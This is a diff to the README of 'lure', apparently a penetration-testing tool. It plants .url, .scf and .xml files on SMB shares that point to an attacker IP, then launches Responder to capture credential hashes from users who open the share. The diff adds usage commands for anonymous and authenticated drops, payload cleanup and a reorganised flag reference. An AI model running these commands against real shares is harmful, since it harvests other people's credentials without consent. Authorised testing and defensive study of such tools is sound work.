@@ -34,12 +34,15 @@ pip install git+https://github.com/Real-Fruit-Snacks/Lure.git
 # Drop a .url file on an open share and start Responder
 sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -u
 
-# Authenticated put across a domain share
+# Authenticated put across a domain share, prompting for the password
 sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 \
-    -a shares -d CORP -U jdoe -P 'S3cret!' -u
+    -a shares -d CORP -U jdoe --ask-pass -u
 
-# Drop all three payload types at once
-sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -A
+# Drop all three payload types at once with a custom basename
+sudo lure -r 10.10.10.5 -l 10.10.14.3 -i tun0 -a public -A --name @docs
+
+# After the engagement: remove the payloads from the share
+sudo lure -r 10.10.10.5 -a public -A --cleanup
 ```
 
 > `lure` requires `smbclient` and `responder` on `$PATH`. On Kali: `sudo apt install smbclient responder`.
@@ -76,28 +79,60 @@ Catppuccin Mocha palette — Teal, Sky, Sapphire, Blue, Lavender — applied via
 
 ## Command Reference
 
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-r`, `--RHOST <ip>` | Target SMB server | -- |
-| `-l`, `--LHOST <ip>` | Attacker IP (embedded in payload UNC path) | -- |
-| `-i`, `--Interface <iface>` | Responder listen interface | -- |
-| `-a`, `--Share <name>` | Target share name | -- |
-| `-o`, `--Other <path>` | Nested subdirectory inside the share | -- |
-| `-d`, `--DOMAIN <name>` | Domain for authenticated upload | -- |
-| `-U`, `--Username <user>` | Username for authenticated upload | -- |
-| `-P`, `--Password <pass>` | Password for authenticated upload | -- |
-| `-u`, `--url` | Generate and drop `@lure.url` | `false` |
-| `-s`, `--scf` | Generate and drop `@lure.scf` | `false` |
-| `-x`, `--xml` | Generate and drop `@lure.xml` | `false` |
-| `-A`, `--All` | Drop URL, SCF, and XML in a single session | `false` |
+### Target
+
+| Flag | Description |
+|------|-------------|
+| `-r`, `--RHOST <ip>` | Target SMB server |
+| `-l`, `--LHOST <ip>` | Attacker IP (embedded in payload UNC path) |
+| `-a`, `--Share <name>` | Target share name |
+| `-o`, `--Other <path>` | Nested subdirectory inside the share |
+| `-i`, `--Interface <iface>` | Responder listen interface |
+
+### Authentication
+
+| Flag | Description |
+|------|-------------|
+| `-d`, `--DOMAIN <name>` | Domain for authenticated upload |
+| `-U`, `--Username <user>` | Username for authenticated upload |
+| `-P`, `--Password <pass>` | Password (visible in `ps`; prefer the alternatives below) |
+| `--ask-pass` | Prompt for the password interactively (no echo) |
+| `$LURE_PASSWORD` | Environment variable consulted when `-P` is absent |
+
+### Payload Selection
+
+| Flag | Description |
+|------|-------------|
+| `-u`, `--url` | Drop the `.url` payload |
+| `-s`, `--scf` | Drop the `.scf` payload |
+| `-x`, `--xml` | Drop the `.xml` payload |
+| `-A`, `--All` | Drop all three in a single `smbclient` session |
+| `--name <base>` | Custom payload basename (default: `@lure`) |
+
+### Modes
+
+| Flag | Description |
+|------|-------------|
+| `--no-responder` | Drop the payload only — skip the Responder handoff |
+| `--cleanup` | Delete previously dropped payloads from the share (implies `--no-responder`) |
+| `-V`, `--version` | Print version and exit |
 
 ### Upload Modes
 
 | Condition | Behavior |
 |-----------|----------|
-| `-U` and `-P` set | Authenticated `smbclient` with `DOMAIN/USER%PASS` |
-| `-o <path>` set | `cd` into nested path before `put` |
+| `-U` and password set | Authenticated upload using `DOMAIN/USER` + `--password` |
+| `-o <path>` set | `cd` into nested path before `put`/`del` |
 | Neither | Anonymous upload to share root |
+
+### Exit Codes
+
+| Code | Meaning |
+|------|---------|
+| `0` | Success |
+| `2` | Invalid argument combination (e.g. username without password) |
+| `4` | Prerequisite missing (`smbclient` or `responder` not on `$PATH`) |
+| other | Propagated from `smbclient` |
 
 ---
 
